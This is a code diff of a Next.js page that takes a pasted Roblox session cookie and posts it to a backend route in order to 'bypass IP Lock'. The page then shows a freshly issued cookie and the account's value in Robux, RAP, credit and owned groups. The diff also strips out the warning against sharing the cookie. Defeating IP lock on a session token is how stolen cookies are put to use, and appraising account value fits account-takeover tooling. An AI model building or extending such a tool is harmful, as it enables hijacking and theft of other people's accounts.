@@ -1,99 +1,62 @@
 'use client';
 
-import { useState, useEffect, useRef } from 'react';
+import { useState } from 'react';
+import { ParticlesCanvas } from '@/components/particles-canvas';
+import { UserInfoModal } from '@/components/user-info-modal';
+
+interface UserData {
+  id: number;
+  name: string;
+  displayName: string;
+  avatarUrl: string;
+  robux: number;
+  pendingRobux: number;
+  summary: number;
+  rap: number;
+  credit: number;
+  groupsOwned: number;
+}
 
 export default function RefreshCookie() {
-  const [userInfo, setUserInfo] = useState('');
+  const [cookie, setCookie] = useState('');
+  const [showUserInfo, setShowUserInfo] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [message, setMessage] = useState('');
-  const canvasRef = useRef<HTMLCanvasElement>(null);
-
-  // Particle animation effect
-  useEffect(() => {
-    const canvas = canvasRef.current;
-    if (!canvas) return;
-
-    const ctx = canvas.getContext('2d');
-    if (!ctx) return;
-
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    const particles: Array<{
-      x: number;
-      y: number;
-      size: number;
-      opacity: number;
-      vx: number;
-      vy: number;
-    }> = [];
-
-    // Create particles
-    for (let i = 0; i < 50; i++) {
-      particles.push({
-        x: Math.random() * canvas.width,
-        y: Math.random() * canvas.height,
-        size: Math.random() * 2 + 0.5,
-        opacity: Math.random() * 0.5 + 0.2,
-        vx: (Math.random() - 0.5) * 0.5,
-        vy: (Math.random() - 0.5) * 0.5,
-      });
-    }
-
-    const animate = () => {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = '#000';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-      particles.forEach((particle) => {
-        particle.x += particle.vx;
-        particle.y += particle.vy;
-
-        // Wrap around edges
-        if (particle.x < 0) particle.x = canvas.width;
-        if (particle.x > canvas.width) particle.x = 0;
-        if (particle.y < 0) particle.y = canvas.height;
-        if (particle.y > canvas.height) particle.y = 0;
-
-        ctx.fillStyle = `rgba(217, 119, 119, ${particle.opacity})`;
-        ctx.beginPath();
-        ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
-        ctx.fill();
-      });
-
-      requestAnimationFrame(animate);
-    };
-
-    animate();
-
-    const handleResize = () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    };
-
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
-  }, []);
+  const [error, setError] = useState('');
+  const [userData, setUserData] = useState<UserData | null>(null);
+  const [newCookie, setNewCookie] = useState('');
+  const [cookieRefreshed, setCookieRefreshed] = useState(false);
 
   const handleRefresh = async () => {
-    if (!userInfo.trim()) {
-      setMessage('Please enter your user information first.');
-      setTimeout(() => setMessage(''), 3000);
+    if (!cookie.trim()) {
+      setError('Please enter a cookie first.');
+      setTimeout(() => setError(''), 3000);
       return;
     }
 
     setIsLoading(true);
-    setMessage('');
+    setError('');
 
     try {
-      // Simulate refresh process
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      setMessage('✓ Cookie refreshed successfully!');
-      setUserInfo('');
-      setTimeout(() => setMessage(''), 3000);
-    } catch (error) {
-      setMessage('✗ Error refreshing cookie. Please try again.');
-      setTimeout(() => setMessage(''), 3000);
+      const res = await fetch('/api/refresh-cookie', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie: cookie.trim() }),
+      });
+
+      const data = await res.json();
+
+      if (!res.ok) {
+        setError(data.error || 'Failed to refresh cookie.');
+        setTimeout(() => setError(''), 5000);
+        return;
+      }
+
+      setUserData(data.user);
+      setNewCookie(data.newCookie);
+      setCookieRefreshed(data.cookieRefreshed);
+    } catch {
+      setError('Network error. Please try again.');
+      setTimeout(() => setError(''), 5000);
     } finally {
       setIsLoading(false);
     }
@@ -102,69 +65,105 @@ export default function RefreshCookie() {
   return (
     <div className="relative w-full min-h-screen bg-black flex items-center justify-center overflow-hidden">
       {/* Particle background */}
-      <canvas
-        ref={canvasRef}
-        className="absolute inset-0 pointer-events-none"
-      />
+      <ParticlesCanvas />
 
       {/* Content */}
-      <div className="relative z-10 w-full max-w-xl px-8">
-        <div className="space-y-8">
+      <div className="relative z-10 w-full max-w-xl px-6">
+        <div className="space-y-6">
           {/* Header */}
-          <div className="text-center space-y-4">
-            <h1 className="text-4xl font-bold text-white">Refresh Cookie</h1>
-            <p className="text-gray-400 text-lg">
+          <div>
+            <h1 className="text-xl font-semibold text-white">Refresh Cookie</h1>
+            <p className="text-gray-500 mt-1">
               Refresh ROBLOX cookie to bypass IP Lock.
             </p>
           </div>
 
-          {/* Warning Box */}
-          <div className="border border-gray-700 rounded-lg p-4 bg-black/50 flex gap-3">
-            <div className="text-2xl flex-shrink-0">⚠️</div>
-            <p className="text-gray-500 text-sm leading-relaxed">
-              _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-other-people-to-hijack-your-account.
-            </p>
-          </div>
-
-          {/* User Information Section */}
-          <div className="space-y-4">
-            <div className="flex items-center gap-2">
-              <div className="w-4 h-4 border-2 border-red-500 rounded"></div>
-              <label className="text-red-500 font-semibold text-sm uppercase tracking-wide">
-                User Information
-              </label>
-            </div>
-
-            {/* Text Area */}
-            <textarea
-              value={userInfo}
-              onChange={(e) => setUserInfo(e.target.value)}
-              placeholder="Paste your user information here..."
-              className="w-full h-40 bg-black border border-gray-700 rounded-lg p-4 text-gray-300 placeholder-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500 resize-none"
+          {/* Cookie Input */}
+          <div className="flex items-center gap-3 border border-gray-700 rounded-lg px-4 py-3 bg-black/50">
+            <svg
+              className="w-5 h-5 text-gray-400 flex-shrink-0"
+              viewBox="0 0 24 24"
+              fill="currentColor"
+              aria-hidden="true"
+            >
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" />
+            </svg>
+            <input
+              type="text"
+              value={cookie}
+              onChange={(e) => setCookie(e.target.value)}
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow..."
+              className="flex-1 bg-transparent text-gray-300 placeholder-gray-600 text-sm focus:outline-none"
             />
           </div>
+
+          {/* User Information Toggle */}
+          <div className="space-y-3">
+            <button
+              type="button"
+              onClick={() => setShowUserInfo(!showUserInfo)}
+              className="flex items-center gap-2 cursor-pointer"
+            >
+              <div
+                className={`w-5 h-5 rounded border-2 flex items-center justify-center transition-colors ${
+                  showUserInfo
+                    ? 'bg-red-500 border-red-500'
+                    : 'border-red-500 bg-transparent'
+                }`}
+              >
+                {showUserInfo && (
+                  <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+                  </svg>
+                )}
+              </div>
+              <span className="text-red-500 font-semibold text-sm uppercase tracking-wide">
+                User Information
+              </span>
+            </button>
+
+            {/* Read-only cookie display */}
+            {showUserInfo && (
+              <textarea
+                readOnly
+                value={cookie}
+                className="w-full h-44 bg-black/30 border border-gray-700 rounded-lg p-4 text-gray-300 text-sm font-mono leading-relaxed resize-none focus:outline-none break-all"
+              />
+            )}
+          </div>
+
+          {/* Error Message */}
+          {error && (
+            <div className="bg-red-500/20 text-red-400 text-sm text-center py-2 px-4 rounded-lg font-medium">
+              {error}
+            </div>
+          )}
 
           {/* Refresh Button */}
           <button
             onClick={handleRefresh}
             disabled={isLoading}
-            className="w-full bg-red-500 hover:bg-red-600 disabled:bg-red-400 text-white font-semibold py-3 px-4 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
+            className="w-full py-3 px-4 rounded-lg font-semibold text-white transition-all duration-200 disabled:cursor-not-allowed"
+            style={{
+              background: isLoading
+                ? 'rgba(239, 68, 68, 0.5)'
+                : 'linear-gradient(135deg, #ef4444 0%, #f87171 50%, #ef4444 100%)',
+            }}
           >
             {isLoading ? 'Refreshing...' : 'Refresh'}
           </button>
-
-          {/* Status Message */}
-          {message && (
-            <div className={`text-center py-3 px-4 rounded-lg font-semibold ${
-              message.includes('✓')
-                ? 'bg-green-500/20 text-green-400'
-                : 'bg-red-500/20 text-red-400'
-            }`}>
-              {message}
-            </div>
-          )}
         </div>
       </div>
+
+      {/* User Info Modal */}
+      {userData && (
+        <UserInfoModal
+          user={userData}
+          newCookie={newCookie}
+          cookieRefreshed={cookieRefreshed}
+          onClose={() => setUserData(null)}
+        />
+      )}
     </div>
   );
 }
